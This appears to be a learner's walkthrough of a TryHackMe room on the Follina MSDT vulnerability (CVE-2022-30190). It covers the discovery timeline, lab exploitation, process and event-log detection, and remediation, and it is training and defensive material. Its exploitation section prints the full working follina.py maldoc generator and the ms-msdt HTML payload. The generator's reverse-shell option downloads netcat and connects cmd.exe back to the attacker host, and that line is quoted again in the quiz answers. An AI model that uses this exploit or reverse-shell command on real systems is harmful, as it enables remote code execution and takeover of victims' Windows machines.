---
A walkthrough on the CVE-2022-30190, the MSDT service, exploitation of the service vulnerability, and consequent detection techniques and remediation processes
---

![|555](https://tryhackme-images.s3.amazonaws.com/room-icons/15270f24a2679e11ec174005425e3ba5.jpeg)

### Introduction 



Microsoft [explains](https://msrc-blog.microsoft.com/2022/05/30/guidance-for-cve-2022-30190-microsoft-support-diagnostic-tool-vulnerability/) that “a remote code execution vulnerability exists when MSDT is called using the URL protocol from a calling application such as Word. An attacker who successfully exploits this vulnerability can run arbitrary code with the privileges of the calling application. The attacker can then install programs, view, change, or delete data, or create new accounts in the context allowed by the user’s rights”

Learning Objectives:

In this room, we will explore what the Microsoft Support Diagnostic Tool is and the discovered vulnerability that it has. In the process, we will be able to experience exploiting this vulnerability and consequently learn some techniques to detect and mitigate its exploitation in our own environments

Room Prerequisites and Expectation Setting:

There are no hard prerequisites in order to gain value from this room, however it would be very helpful to have a basic understanding of various scripting tools e.g. Windows CLI, Linux Bash Terminal, and PowerShell. Further, this room will touch upon Windows Processes and Data Correlation in lieu of Threat Hunting, albeit nothing too deep nor too complex to be understood.

###  CVE-2022-30190 

Microsoft Support Diagnostic Tool which provides the troubleshooting wizard to diagnose Wi-Fi and audio problems

The MSDT exploit is not something new - in fact, a bachelor’s thesis has been published August of 2020 regarding techniques on how to use MSDT for code execution. Almost two years after that initial publication, pieces of evidence of MSDT exploitation as well as code execution via Office URIs has triggered several independent researchers to file separate reports to [MSRC](https://msrc-blog.microsoft.com/), the latter of which has been patched (specifically in Microsoft Teams) whereas the former remained vulnerable

It’s not until the discovery of nao_sec, which has been made public in twitter, that attacks using this particular vector is actively being made in the wild. This is consequently picked up by Kevin Beaumont who publicly identified it as a zero day that Microsoft EDR products are failing to detect, and then later classified by Microsoft as a zero day with the vulnerability name CVE-2022-30190


Summarized timeline of its discovery:

    August 1st 2020  — A bachelor thesis is published detailing how to use MSDT to execute code https://benjamin-altpeter.de/doc/thesis-electron.pdf
    March 10th 2021  — researchers report to Microsoft how to use Microsoft Office URIs to execute code using Microsoft Teams as an example. Microsoft fail to issue a CVE or inform customers, but stealth patched it in Microsoft Teams in August 2021. They did not patch MSDT in Windows or the vector in Microsoft Office (Link) https://positive.security/blog/ms-officecmd-rce
    April 12th 2022  — first report to Microsoft MSRC of exploitation in wild via MSDT, by leader of Shadowchasing1, an APT hunting group. This document is an in the wild, real world exploit targeting Russia, themed as a Russian job interview https://twitter.com/CrazymanArmy/status/1531117401181671430?s=20&t=7xvbwh1HXx2sgPh_ms7IzA

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/7a1c3347258d011c7a5eae7ead9e4113.png)

Microsoft Security Response Center

April 21st 2022  — Microsoft MSRC closed the ticket saying not a security related issue (for the record, msdt executing with macros disabled is an issue)

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/1ed510ea7ae885e8d03d457a0f4f07ed.png)

    May 27th 2022  — Security vendor Nao tweet a document uploaded from Belarus, which is also an in the wild attack.
    May 29th 2022  — Kevin Beaumont identified this was a zero day publicly as it still works against Office 365 Semi Annual channel, and ‘on prem’ Office versions and EDR products are failing to detect
    May 31st 2022  — Microsoft classify this a zero day in Microsoft Defender Vulnerability Management
    https://www.virustotal.com/gui/file/4a24048f81afbe9fb62e7a6a49adbd1faf41f266b5f9feecdceb567aec096784/behavior

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/7c3e1e5de237a497ee277f8490efc967.png)

    June 14th 2022  — a fix for this vulnerability, CVE-2022–30190, is available in June 2022’s Patch Tuesday https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2022-30190

Further readings:

    Follina — a Microsoft Office code execution vulnerability | by Kevin Beaumont | May, 2022 | DoublePulsar
    https://doublepulsar.com/follina-a-microsoft-office-code-execution-vulnerability-1a47fce5629e
        Full timeline, early details regarding the vulnerability, and “Follina” namesake courtesy of Kevin Beaumont
    Rapid Response: Microsoft Office RCE - “Follina” MSDT Attack (huntress.com)
    https://www.huntress.com/blog/microsoft-office-remote-code-execution-follina-msdt-bug


What year was MSDT first discovered to be vulnerable to code execution?
*2020*



Who is the author of the bachelor's thesis which first detailed this vulnerability?
*Benjamin Altpeter*



What is the name of the APT hunting group who first reported evidence of exploitation in the wild of MSDT to MSRC? 
*Shadowchasing1*

### The MSDT Service 



[Microsoft](https://docs.microsoft.com/en-us/troubleshoot/sql/general/answers-questions-msdt) states that “the Microsoft Support Diagnostic Tool (MSDT) collects information to send to Microsoft Support. They will then analyze this information and use it to determine the resolution to any problems that you may be experiencing on your computer”

With that in mind, it’s essentially a way for Microsoft Support to immediately see what’s wrong as they’re getting all the information they need straight from the source

Think of it like this - you’re having car problems and you don’t know about cars at all. You call your trusty car mechanic, but instead of him asking you to check different parts of the car while he tries to deduce what’s wrong with it remotely, he just gives you a passkey, instructs you how to use it and the car will magically produce a report that you can then send to the mechanic. Quick, easy, and efficient.

Further reading: Windows 10 CTP: How To Run Microsoft Support Diagnostic Tool - TechNet Articles - United States (English) - TechNet Wiki
https://social.technet.microsoft.com/wiki/contents/articles/30458.windows-10-ctp-how-to-run-microsoft-support-diagnostic-tool.aspx


What's one thing you need that the support will provide you when you're using the MSDT legitimately? 
*passkey*

### Exploiting the Follina Windows Vulnerability 

Click the Start Machine button on this task before continuing. The machine will be available on your web browser, in split-screen view. 

Before we do any exploitation in the machine, let’s first try and make sense of the baseline processes of the machine. It is in having a sense of normalcy that we’d be able to spot minute changes later on that may consequently reveal malicious activity by a threat actor in our environment.

The [process explorer](https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer) from sysinternals has already been downloaded and pinned in the taskbar for easier access. Proceed to open it and scan through the processes currently running in the machine. Keep it open as we go through the activities later on so you'd be able to immediately see how an exploited follina-msdt vulnerability would look like as compared to the "baseline" - the processes that we're seeing while the machine is immaculate.

Exploit Explanation

Let’s start with a disclaimer: for our purposes, we’ll be loading our payload via a word document, particularly in the .docx format - this is the original exploit that has been [discovered in the wild](https://www.virustotal.com/gui/file/4a24048f81afbe9fb62e7a6a49adbd1faf41f266b5f9feecdceb567aec096784/detection). However, this vulnerability has been proved to work in a number of other office products, and the student is obliged to maximize learning by trying them out separately.

Two important aspects of this vulnerability are: 1) specific docx files contain OLE (originally abbreviates to Object Linking and Embedding) Object references, and sometimes, they take the form of HTML files hosted elsewhere, and 2) MS-MSDT allows for code execution.

Combining the above two aspects together, an MS-MSDT HTML scheme can be used to execute PowerShell code, and that a docx file can be used to load it via word’s external reference capability.

	More specifically, drilling into the docx structure, the word/_rels/document.xml.rels file has an XML tag <Relationship> with an attribute Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" that describes an external oleObject reference. In order to exploit this docx feature, we can edit the contents of this tag to point instead to the payload that we're hosting by changing the Target value into http://<external_payload_server.com>/<payload.html> and the TargetMode value into "External".

	In the word/document.xml file, there's an XML tag that starts with <o:OLEObject...> wherein we should change the Type value to "Link" and then add the Key-Value pair attribute UpdateMode="OnCall".

The only thing left to do now is to host the payload that the word file will be connecting to, and receiving instructions from upon opening of the file. This is done by creating an html file with a structure similar to this:

```
<!doctype html>

<html lang="en">

<body>

<script>

//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA should be repeated >60 times

  window.location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=cal?c IT_SelectProgram=NotListed IT_BrowseForFile=h$(IEX('calc.exe'))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe \"";

</script>

</body>

</html>
```

In the above contents of the html file, you'd notice the ms-msdt:/id PCWDiagnostic /skip force /param command, along with the command switches you can use to set the command you want to execute in the target machine. You can then mix and match the payload according to your purposes.

As such, we now have a way to achieve remote code execution without touching any macros, and as we'll see later, without even opening the malicious document.

Publicly Available Exploit Focus: [JohnHammond/msdt-follina](https://github.com/JohnHammond/msdt-follina)

John Hammond has created a tool to automate the process of creating a malicious document (maldoc) and consequently host the malicious html file that houses the bad command. The tool is documented in the link above, and we will be using a forked version of it to further understand the concept of the exploit touched upon earlier.

To start with our experiment, open a terminal instance in your Attackbox and enter the following command:

```

msdt-follina

           
root@attackbox:~# cd ~/Rooms/Follina-MSDT

```

We change our working directory to ~/Rooms/Follina-MSDT, where the msdt-follina repository has been cloned for you.

```

Launch the exploit

           
root@attackbox:~/Rooms/Follina-MSDT# python3.9 follina.py
[+] copied staging doc /tmp/[random string]
[+] created maldoc ./follina.doc
[+] serving html payload on :8000

```

Upon firing up the exploit, you should be hosting the file already, so it’s ready to be “delivered” to the victim machine. Effective delivery mechanisms of malicious payloads are outside the scope of this room, so we’ll just settle for a simpler way of transferring files from linux to windows:

While keeping the original terminal open, open another terminal in your Attackbox and enter the following command:

```

Simple HTTP Server

           
root@attackbox:~# cd ~/Rooms/Follina-MSDT 
root@attackbox:~/Rooms/Follina-MSDT# python -m http.server 3456
Serving HTTP on 0.0.0.0 port 3456 (http://0.0.0.0:3456/) ...


```


Start the Windows machine and wait for it to initialize. When everything's settled, proceed to open a command prompt and enter the following command: 

```

Maldoc Download

           
Microsoft Windows [Version]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Administrator> cd Desktop
C:\Users\Administrator\Desktop> curl http://[attackbox IP]:3456/follina.doc -o follina.docx


```

This downloads the maldoc in our machine and as such, shortly after, you should be able to see the word file named follina.docx appear in the Desktop, ready to be run. When you're ready, open the file and watch what happens.

For now, let's allow the maldoc and all of the stuff that it spawned, to remain running, while we examine the contents of the process explorer.

Process Explorer

Looking at the process explorer may be daunting as there are a ton of processes always running within the machine. In our case, we haven't done a lot of stuff with it and yet the number of running processes already covers the entire screen. This is where the importance of "making sense of the baseline", discussed in the first part of this task, is emphasized.

If you don't have any established baseline, it's easy to get paranoid and everything will suddenly seem to be suspicious. This is where you start wasting your time checking each and every process there is - mainly because you're unfamiliar with each and every one of them.

Scrolling through the processes, you'll be able to spot WINWORD.EXE immediately, followed by an msdt.exe child process. Somewhere in the list of processes you'll be able to see a process for the calculator as well which is the win32calc.exe. It might look something like this, although it's completely normal if the WINDWORD.EXE and the win32calc.exe are far away from each other.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/c88e19f2ecbbac119deabd3377309580.png)

Now, finding these artifacts are easy because we already know what to look for, but how do we tackle the ones that we don't know about, the so called unknown unknowns? Well, we can refer to the baseline that we have, we compare, and then we validate.

"Zero Click" Implementation

In order to replicate the “zero click” implementation of this vulnerability, we simply head to the malicious word file, add a cute message (completely optional),  save it in the Rich Text Format (RTF), and we’re good to go. This implementation assumes that the victim machine is in the preview pane view, else it will revert to the original functionality which will still run upon opening of the file.

﻿Open the file explorer and navigate to the Desktop folder. There you will see the seemingly honest file that we made that needs clicking, proceed to click it once careful not to actually open it and see what will happen.

Despite not actually opening the file, the exploit ran in the same manner that it did earlier in this exercise. This happened because of two key features: 1) the feature of the File Explorer to preview files before opening them, and 2) the RTF which allows the feature of document files being able to be previewed in the File Explorer before being opened (among other purposes).

Combining the two and then abusing them will result in an attack vector that we’ve just witnessed now.

```
root@ip-10-10-1-188:~# cd Rooms/Follina-MSDT/
root@ip-10-10-1-188:~/Rooms/Follina-MSDT# ls
doc  follina.py  nc64.exe  README.md
root@ip-10-10-1-188:~/Rooms/Follina-MSDT# cat follina.py 
#!/usr/bin/env python3

import argparse
import zipfile
import tempfile
import shutil
import os
import netifaces
import ipaddress
import random
import base64
import http.server
import socketserver
import string
import socket
import threading

parser = argparse.ArgumentParser()

parser.add_argument(
    "--command",
    "-c",
    default="calc",
    help="command to run on the target (default: calc)",
)

parser.add_argument(
    "--output",
    "-o",
    default="./follina.doc",
    help="output maldoc file (default: ./follina.doc)",
)

parser.add_argument(
    "--interface",
    "-i",
    default="eth0",
    help="network interface or IP address to host the HTTP server (default: eth0)",
)

parser.add_argument(
    "--port",
    "-p",
    type=int,
    default="8000",
    help="port to serve the HTTP server (default: 8000)",
)

parser.add_argument(
    "--reverse",
    "-r",
    type=int,
    default="0",
    help="port to serve reverse shell on",
)


def main(args):

    # Parse the supplied interface
    # This is done so the maldoc knows what to reach out to.
    try:
        serve_host = ipaddress.IPv4Address(args.interface)
    except ipaddress.AddressValueError:
        try:
            serve_host = netifaces.ifaddresses(args.interface)[netifaces.AF_INET][0][
                "addr"
            ]
        except ValueError:
            print(
                "[!] error detering http hosting address. did you provide an interface or ip?"
            )
            exit()

    # Copy the Microsoft Word skeleton into a temporary staging folder
    doc_suffix = "doc"
    staging_dir = os.path.join(
        tempfile._get_default_tempdir(), next(tempfile._get_candidate_names())
    )
    doc_path = os.path.join(staging_dir, doc_suffix)
    shutil.copytree(doc_suffix, os.path.join(staging_dir, doc_path))
    print(f"[+] copied staging doc {staging_dir}")

    # Prepare a temporary HTTP server location
    serve_path = os.path.join(staging_dir, "www")
    os.makedirs(serve_path)

    # Modify the Word skeleton to include our HTTP server
    document_rels_path = os.path.join(
        staging_dir, doc_suffix, "word", "_rels", "document.xml.rels"
    )

    with open(document_rels_path) as filp:
        external_referral = filp.read()

    external_referral = external_referral.replace(
        "{staged_html}", f"http://{serve_host}:{args.port}/index.html"
    )

    with open(document_rels_path, "w") as filp:
        filp.write(external_referral)

    # Rebuild the original office file
    shutil.make_archive(args.output, "zip", doc_path)
    os.rename(args.output + ".zip", args.output)

    print(f"[+] created maldoc {args.output}")

    command = args.command
    if args.reverse:
        command = f"""Invoke-WebRequest https://github.com/JohnHammond/msdt-follina/blob/main/nc64.exe?raw=true -OutFile C:\\Windows\\Tasks\\nc.exe; C:\\Windows\\Tasks\\nc.exe -e cmd.exe {serve_host} {args.reverse}"""

    # Base64 encode our command so whitespace is respected
    base64_payload = base64.b64encode(command.encode("utf-8")).decode("utf-8")

    # Slap together a unique MS-MSDT payload that is over 4096 bytes at minimum
    html_payload = f"""<script>location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \\"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'{base64_payload}'+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\\""; //"""
    html_payload += (
        "".join([random.choice(string.ascii_lowercase) for _ in range(4096)])
        + "\n</script>"
    )

    # Create our HTML endpoint
    with open(os.path.join(serve_path, "index.html"), "w") as filp:
        filp.write(html_payload)

    class ReuseTCPServer(socketserver.TCPServer):
        def server_bind(self):
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.socket.bind(self.server_address)

    class Handler(http.server.SimpleHTTPRequestHandler):
        def __init__(self, *args, **kwargs):
            super().__init__(*args, directory=serve_path, **kwargs)

        def log_message(self, format, *func_args):
            if args.reverse:
                return
            else:
                super().log_message(format, *func_args)

        def log_request(self, format, *func_args):
            if args.reverse:
                return
            else:
                super().log_request(format, *func_args)

    def serve_http():
        with ReuseTCPServer(("", args.port), Handler) as httpd:
            httpd.serve_forever()

    # Host the HTTP server on all interfaces
    print(f"[+] serving html payload on :{args.port}")
    if args.reverse:
        t = threading.Thread(target=serve_http, args=())
        t.start()
        print(f"[+] starting 'nc -lvnp {args.reverse}' ")
        os.system(f"nc -lnvp {args.reverse}")

    else:
        serve_http()


if __name__ == "__main__":

    main(parser.parse_args())
root@ip-10-10-1-188:~/Rooms/Follina-MSDT# cd doc/
root@ip-10-10-1-188:~/Rooms/Follina-MSDT/doc# ls
'[Content_Types].xml'   docProps   _rels   word
root@ip-10-10-1-188:~/Rooms/Follina-MSDT/doc# cat '[Content_Types].xml' 
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/><Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/><Override PartName="/word/styles.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.styles+xml"/><Override PartName="/word/settings.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.settings+xml"/><Override PartName="/word/webSettings.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.webSettings+xml"/><Override PartName="/word/fontTable.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.fontTable+xml"/><Override PartName="/word/theme/theme1.xml" ContentType="application/vnd.openxmlformats-officedocument.theme+xml"/><Override PartName="/docProps/core.xml" ContentType="application/vnd.openxmlformats-package.core-properties+xml"/><Override PartName="/docProps/app.xml" ContentType="application/vnd.openxmlformats-officedocument.extended-properties+xml"/></Types>root@ip-10-10-1-188:~/Rooms/Follina-MSDT/doc# ls
'[Content_Types].xml'   docProps   _rels   word
root@ip-10-10-1-188:~/Rooms/Follina-MSDT/doc# cd word/
root@ip-10-10-1-188:~/Rooms/Follina-MSDT/doc/word# ls
document.xml   _rels         styles.xml  webSettings.xml
fontTable.xml  settings.xml  theme
root@ip-10-10-1-188:~/Rooms/Follina-MSDT/doc/word# cat webSettings.xml 
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:webSettings xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:w14="http://schemas.microsoft.com/office/word/2010/wordml" xmlns:w15="http://schemas.microsoft.com/office/word/2012/wordml" xmlns:w16cex="http://schemas.microsoft.com/office/word/2018/wordml/cex" xmlns:w16cid="http://schemas.microsoft.com/office/word/2016/wordml/cid" xmlns:w16="http://schemas.microsoft.com/office/word/2018/wordml" xmlns:w16se="http://schemas.microsoft.com/office/word/2015/wordml/symex" mc:Ignorable="w14 w15 w16se w16cid w16 w16cex"><w:optimizeForBrowser/><w:allowPNG/></w:webSettings>root@ip-10-10-1-188:~/Rooms/Follina-MSDT/doc/word# 

```

```
using attackbox later on my machine

root@ip-10-10-1-188:~/Rooms/Follina-MSDT# python3.9 follina.py 
[+] copied staging doc /tmp/lex0kznd
[+] created maldoc ./follina.doc
[+] serving html payload on :8000

root@ip-10-10-1-188:~/Rooms/Follina-MSDT# python -m http.server 3456
Serving HTTP on 0.0.0.0 port 3456 (http://0.0.0.0:3456/) ...
10.10.198.117 - - [29/Oct/2022 00:27:16] "GET /follina.doc HTTP/1.1" 200 -

Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Administrator>cd Desktop

C:\Users\Administrator\Desktop>curl http://10.10.1.188:3456/follina.doc -o follina.docx
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 10694  100 10694    0     0  10694      0  0:00:01 --:--:--  0:00:01  652k


after clicking follina word

root@ip-10-10-1-188:~/Rooms/Follina-MSDT# python3.9 follina.py 
[+] copied staging doc /tmp/lex0kznd
[+] created maldoc ./follina.doc
[+] serving html payload on :8000
10.10.198.117 - - [29/Oct/2022 00:31:03] code 501, message Unsupported method ('OPTIONS')
10.10.198.117 - - [29/Oct/2022 00:31:03] "OPTIONS / HTTP/1.1" 501 -
10.10.198.117 - - [29/Oct/2022 00:31:04] "HEAD /index.html HTTP/1.1" 200 -
10.10.198.117 - - [29/Oct/2022 00:31:04] code 501, message Unsupported method ('OPTIONS')
10.10.198.117 - - [29/Oct/2022 00:31:04] "OPTIONS / HTTP/1.1" 501 -
10.10.198.117 - - [29/Oct/2022 00:31:04] "GET /index.html HTTP/1.1" 200 -
10.10.198.117 - - [29/Oct/2022 00:31:04] "HEAD /index.html HTTP/1.1" 200 -
10.10.198.117 - - [29/Oct/2022 00:31:04] "HEAD /index.html HTTP/1.1" 200 -
10.10.198.117 - - [29/Oct/2022 00:31:04] code 501, message Unsupported method ('OPTIONS')
10.10.198.117 - - [29/Oct/2022 00:31:04] "OPTIONS / HTTP/1.1" 501 -
10.10.198.117 - - [29/Oct/2022 00:31:04] "HEAD /index.html HTTP/1.1" 200 -
10.10.198.117 - - [29/Oct/2022 00:31:04] code 501, message Unsupported method ('OPTIONS')
10.10.198.117 - - [29/Oct/2022 00:31:04] "OPTIONS / HTTP/1.1" 501 -
10.10.198.117 - - [29/Oct/2022 00:31:04] "GET /index.html HTTP/1.1" 304 -
10.10.198.117 - - [29/Oct/2022 00:31:04] "HEAD /index.html HTTP/1.1" 200 -
10.10.198.117 - - [29/Oct/2022 00:31:04] "HEAD /index.html HTTP/1.1" 200 -
10.10.198.117 - - [29/Oct/2022 00:32:32] "HEAD /index.html HTTP/1.1" 200 -


```

![[Pasted image 20221028183144.png]]

“Zero Click” Implementation

    In order to replicate the “zero click” implementation of this vulnerability, we simply head to the malicious word file, add a cute message (completely optional), save it in the Rich Text Format (RTF), and we’re good to go. This implementation assumes that the victim machine is in the preview pane view, else it will revert to the original functionality which will still run upon opening of the file.
    
![](https://miro.medium.com/max/720/1*36G5s5CRs_0g_xPiIU8VFw.png)

![](https://miro.medium.com/max/720/1*ZB4BIKkAfesDD9PwJpa9Vw.png)

![](https://miro.medium.com/max/720/1*XGCtrjSYp-9MpM2CIR1JiQ.png)

![](https://miro.medium.com/max/720/1*tujydyxQTfYxkZzx2qn6iw.png)
And the calculator got spawned even without opening the maldoc! 😱

	What application got executed upon opening of the maldoc that signified compromise? Answer format is "<app>.exe"
*win32calc.exe*



What is the filename of the .docx file that has been discovered in the wild? Write it exactly as you see it.

Fun fact: The last part of the filename is actually the area code of Follina, Italy which is where this vulnerability got it's name from.
External Research Required
![[Pasted image 20221028185635.png]]
https://www.virustotal.com/gui/file/4a24048f81afbe9fb62e7a6a49adbd1faf41f266b5f9feecdceb567aec096784/details
*05-2022-0438.doc*


The PoC that we used has the capability to establish a reverse shell upon exploit - what binary is being used to accomplish this?
Check the follina.py file
```
command = f"""Invoke-WebRequest https://github.com/JohnHammond/msdt-follina/blob/main/nc64.exe?raw=true -OutFile C:\\Windows\\Tasks\\nc.exe; C:\\Windows\\Tasks\\nc.exe -e cmd.exe {serve_host} {args.reverse}"""
```
*netcat* 


	Where is this binary being downloaded?
	*C:\\Windows\\Tasks*


In the original exploit execution, two parent processes are of interest in the list of running processes in Process Explorer, one of them is WINWORD.EXE. Can you find the other one?
Pay attention to own processes (purple highlight). Close everything and check process explorer again. Re-run the maldoc and check process explorer again.
![[Pasted image 20221028190150.png]]

*sdiagnhost.exe*


What is the child process of WINWORD.EXE?
![[Pasted image 20221028190226.png]]
*msdt.exe*


What is the child process of the other interesting parent process?
![[Pasted image 20221028190351.png]]
*conhost.exe*


What process would be the most obvious piece of evidence to conclude that the "Zero Click" implementation of the exploit was used?
Close everything and check process explorer again. Re-run the maldoc and check process explorer again. ;) hehe

![](https://miro.medium.com/max/1400/1*vk8xVWRL5hY6cLHo5h6Emg.png)

*prevhost.exe*

###  Detection 

Threat hunting

﻿The Windows machine that we’ve used to study the exploitation of the vulnerability has been pre-configured to have logging enabled for:

    Audit Process Creation
    Command Line Process Auditing, and
    Script Block Logging

These auditing mechanisms are not configured by default and as such, it is imperative that these are turned on in your own environments to aid in the detection of suspicious behavior, and to help keep valuable data available for forensic examiners.

During the previous task, we've identified a number of interesting process creations upon the exploitation of the vulnerability. These process creations are logged in Windows Security Logs, ready to be analyzed via your favorite viewer, or forwarded to a centralized log collector to be processed then further used later on.

For this task we'll be using [Event Log Viewer for Windows](http://www.nirsoft.net/utils/full_event_log_view.html) by Nirsoft to check out the process creations we've identified earlier. We will then look for details within these process creations that we can use to look for clues in other event logs to explain better what happened behind the scenes. The Event Log Viewer has been pinned in the Taskbar for you.

Proceed to open FullEventLogView pinned in your taskbar. Go to View > Use Quick Filter. A search bar should appear on top of the logs which would allow us to do quick searches. Since we wanted to check the details of our process creations, we can click on the left-most drop down menu and choose Find Event ID (space/comma...), then type 4688 to the search bar provided as shown below:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/d1702225acb5cfc44ab029192a455ca4.png)

The screen should populate with Process Creation events and you'll notice immediately  that there's a ton of them, despite having minimal interaction with the machine.

The first artifact we'll check is winword.exe - understanding the flow of events from this process gives us an idea how an office process in general, will behave in the context of an msdt exploitation. Hit Ctrl+F to spawn a Find function and type in winword. 

The first entry that you'll probably see is the one where WINWORD.EXE is the new process being created, identified by the detail: New Process Name. This process marks the opening of the follina.docx file, via by the detail: Process Command Line. It should look like the one below, though it's completely normal for it not to look exactly the same.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/f805b0a62927fff054b878a295605e80.png)

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/0aa4ce4c1527a9d1b160302e7a186d8d.png)

Click the Find Next button until you find an entry that looks something like this:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/bab2ae3b9ce95e9af6db64e617b35dad.png)

Here we'll see that the WINWORD.EXE is the Creator Process, more commonly known as the Parent Process of msdt.exe. Notice the long command line entry that contains multiple PowerShell cmdlets (pronounced command-lets) as well as multiple directory traversals. Seeing this, on its own, in your environment should raise immediate red flags. One free nugget that we can look closely here is the string Y2FsYw== that when decoded would result in the string calc.

Since we saw PowerShell cmdlets, it would make sense for us to filter out PowerShell events to further check this lead. Since there's a lot of unique event IDs that log PowerShell events, we can filter via Provider. Go to Options > Advanced Options. Click the second dropdown menu and select Show only the specific providers (comma-delimited...). Type PowerShell enclosed with wildcards (*) so all providers with regards to PowerShell will be included.

![[Pasted image 20221028192648.png]]

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/671f03a57359033de387b25a1d087300.png)

Clear the "Quick Filter" box of the 4688 we entered earlier, and the screen should populate with events that exclusively come from PowerShell providers. From here, we can filter the events via part of the PowerShell command we've noted above.

![[Pasted image 20221028193003.png]]

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/bb40ec87492639e3e808b7a38b5e586c.png)

Upon arriving in this event, we can close the find function and then proceed to follow the trail of this Scriptblock text; you can navigate to the next event by pressing the down key in your keyboard, or manually clicking the event. Exploring the immediate events that follow this scriptblock text will show the step-by-step execution of calc in the perspective of PowerShell.

There's still a lot to be explored in the above scriptblock alone but for the sake of brevity, it will be left to the student to explore further and see what else they can uncover. Questions at the end of this task may serve as guide as well.

Sigma rule availability https://gist.github.com/matthewB-huntress/14ab9d309f25a05fc9305a8e7f351089

Huntress Detection Engineer Matthew Brennan has created a sigma rule to detect suspicious MSDT executions in the environment and the best thing about it is that it keeps getting updated whenever the community spots something new.

The sigma rule can be found here.

[Uncoder.IO](https://uncoder.io/) is a nice tool that helps convert sigma rules to queries that can be immediately used within a SIEM of your choice.
Security Information and Event Management system that is used to aggregate security information in the form of logs, alerts, artifacts and events into a centralized platform that would allow security analysts to perform near real-time analysis during security monitoring. 
In hunting for MSDT exploits around the environment, you may opt to use the sigma rule as a detection mechanism for both:

    Analytics for use in near real time detections of exploits, and
    Retroactive checks of prior intrusions

MSDT also uses another [binary](https://twitter.com/KyleHanslovan/status/1531114931973767168) to channel executions and so, suspicious child processes with it as the parent should be noted and further investigated. The "redacted" information above is an answer to a question in the previous task - check at your own spoilage.

Further reading:

    Detecting Follina: Microsoft Office remote code execution zero-day https://www.logpoint.com/en/blog/detecting-follina-microsoft-office-remote-code-execution-zero-day/

Antivirus / Windows Defender

A number of Microsoft Defender products have detection mechanisms in place and our trusty Microsoft Security Response Center provides us a list of those
https://msrc-blog.microsoft.com/2022/05/30/guidance-for-cve-2022-30190-microsoft-support-diagnostic-tool-vulnerability/

![[Pasted image 20221028193355.png]]


What encoding is used in the string Y2FsYw==
*base64*


What is the parent process of calc.exe?
*sdiagnhost.exe*


![[Pasted image 20221028194459.png]]

Diagnostic package index information is loaded from what file path?
https://answers.microsoft.com/en-us/windows/forum/all/cwindowsdiagnosticsindexdevicediagnosticxml/2a6039d8-90b5-48e7-9df0-556d6ecbeb4f
![[Pasted image 20221028194830.png]]
		
		*C:\Windows\diagnostics\index*

### Remediation 

The patch for this vulnerability is in the June 2022 cumulative [Windows Updates](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2022-30190). It is imperative that users install these updates to be protected from the vulnerability.

You can either do this manually every so often, which isn’t very efficient and prone to be forgotten, or you can opt to automate checking and installation of updates. Nowadays it’s as easy as typing “updates” in the search bar and it will immediately bring you to the updates section of the computer’s settings.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/384b4ff19504919caa6646c149a0c686.png)

Disable MSDT URL Protocol

Before the patch has been introduced, security teams scrambled their organization’s IT Administrators to immediately disable the MSDT URL Protocol. By disabling the MSDT URL Protocol, troubleshooters will not be launched as links and so ms-msdt won’t be able to be called by Office.

To disable the protocol, first run a command prompt as administrator (for our VM, it's automatically ran as administrator). 

```

ms-msdt url backup and deletion

           
Microsoft Windows [Version]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Administrator> cd Desktop
C:\Users\Administrator\Desktop> reg query HKEY_CLASSES_ROOT\ms-msdt

HKEY_CLASSES_ROOT\ms-msdt
          [...]

HKEY_CLASSES_ROOT\ms-msdt\shell

C:\Users\Administrator\Desktop> reg export HKEY_CLASSES_ROOT\ms-msdt ms-msdt_backup
